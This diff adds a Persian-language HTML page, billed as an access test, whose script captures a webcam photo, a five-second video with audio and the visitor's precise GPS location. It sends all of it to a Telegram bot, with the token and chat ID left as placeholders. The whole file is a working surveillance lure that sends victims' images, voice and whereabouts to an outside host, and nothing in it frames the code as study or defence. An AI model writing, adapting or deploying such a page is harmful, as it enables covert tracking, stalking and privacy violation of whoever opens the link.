@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>گرفتن دسترسی و ارسال به تلگرام</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
+        .container { max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        video { width: 100%; max-width: 300px; border-radius: 10px; margin: 10px 0; }
+        button { background: #0088cc; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; }
+        button:disabled { background: #ccc; cursor: not-allowed; }
+        #status { margin: 15px 0; font-weight: bold; color: #0088cc; }
+        #error { color: #d32f2f; margin: 10px 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #0088cc; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>تست دسترسی</h2>
+        <p>روی دکمه کلیک کنید تا دسترسی‌ها گرفته بشه و به تلگرام فرستاده بشه.</p>
+
+        <video id="webcam" autoplay playsinline muted></video>
+        <div class="loader" id="loader"></div>
+
+        <button id="startBtn">شروع ضبط و ارسال</button>
+        <div id="status"></div>
+        <div id="error"></div>
+    </div>
+
+    <script>
+        // ==== تنظیمات تلگرام ====
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // توکن بات
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';      // چت آیدی (عدد)
+
+        const webcam = document.getElementById('webcam');
+        const startBtn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+        const error = document.getElementById('error');
+        const loader = document.getElementById('loader');
+
+        let stream = null;
+        let recorder = null;
+
+        startBtn.addEventListener('click', async () => {
+            startBtn.disabled = true;
+            loader.style.display = 'block';
+            status.textContent = 'در حال درخواست دسترسی...';
+            error.textContent = '';
+
+            try {
+                // 1. دسترسی به وبکم و میکروفون
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 640, height: 480 },
+                    audio: true
+                });
+                webcam.srcObject = stream;
+                status.textContent = 'دسترسی داده شد. در حال ضبط...';
+
+                // 2. گرفتن اسکرین‌شات
+                const photoBlob = await capturePhoto();
+
+                // 3. ضبط ویدیو 5 ثانیه‌ای
+                const videoBlob = await recordVideo(stream);
+
+                // 4. گرفتن لوکیشن دقیق
+                const location = await getLocation();
+
+                // 5. ارسال به تلگرام
+                await sendToTelegram(photoBlob, videoBlob, location);
+
+                status.textContent = 'همه چیز با موفقیت ارسال شد!';
+            } catch (err) {
+                error.textContent = `خطا: ${err.message}`;
+                console.error(err);
+            } finally {
+                stopStream();
+                startBtn.disabled = false;
+                loader.style.display = 'none';
+            }
+        });
+
+        // گرفتن عکس از وبکم
+        function capturePhoto() {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                canvas.width = webcam.videoWidth;
+                canvas.height = webcam.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(webcam, 0, 0);
+                canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+            });
+        }
+
+        // ضبط ویدیو
+        function recordVideo(stream) {
+            return new Promise((resolve) => {
+                const chunks = [];
+                recorder = new MediaRecorder(stream, { mimeType: 'video/mp4' });
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    resolve(blob);
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); // 5 ثانیه
+            });
+        }
+
+        // گرفتن لوکیشن دقیق
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const { latitude, longitude, accuracy } = pos.coords;
+                        const mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+                        resolve({ latitude, longitude, accuracy, mapLink });
+                    },
+                    reject,
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+
+        // ارسال به تلگرام
+        async function sendToTelegram(photoBlob, videoBlob, location) {
+            const text = `
+📍 <b>لوکیشن دقیق</b>
+عرض جغرافیایی: <code>${location.latitude}</code>
+طول جغرافیایی: <code>${location.longitude}</code>
+دقت: <code>${location.accuracy.toFixed(1)} متر</code>
+<a href="${location.mapLink}">نقشه</a>
+            `.trim();
+
+            // ارسال عکس
+            const photoForm = new FormData();
+            photoForm.append('chat_id', CHAT_ID);
+            photoForm.append('photo', photoBlob, 'webcam.jpg');
+            photoForm.append('caption', text);
+            photoForm.append('parse_mode', 'HTML');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: photoForm
+            });
+
+            // ارسال ویدیو
+            const videoForm = new FormData();
+            videoForm.append('chat_id', CHAT_ID);
+            videoForm.append('video', videoBlob, 'recording.mp4');
+            videoForm.append('caption', 'ویدیو ۵ ثانیه‌ای با صدا');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: videoForm
+            });
+        }
+
+        // توقف استریم
+        function stopStream() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                webcam.srcObject = null;
+            }
+            if (recorder && recorder.state === 'recording') {
+                recorder.stop();
+            }
+        }
+    </script>
+</body>
+</html>
